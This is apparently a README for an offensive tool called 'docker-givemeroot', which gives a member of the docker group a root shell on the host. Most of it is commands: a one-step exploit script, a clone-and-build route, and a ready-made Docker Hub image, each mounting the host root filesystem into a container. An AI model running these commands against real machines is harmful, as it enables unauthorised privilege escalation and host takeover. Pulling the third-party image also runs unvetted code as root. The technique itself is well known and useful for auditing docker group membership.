docker-givemeroot
=================

If you're a member of the 'docker' group on a machine, this command gives you a root shell on the host OS. 
It's not a vuln it works because of a design decision by docker. 

Simple usage
---------------------

```bash
>  ./exploit.sh 
```

Manual instructions
--------------------
 
```bash
> git clone https://github.com/mikaelkall/exploits.git exploits
> cd exploits/docker-givemeroot/
> docker build -t givemeroot .
> docker run -v /:/mnt -i -t givemeroot
```

From dockerhub
---------------------

```bash
> docker run -v /:/mnt -i -t nighter/givemeroot
```
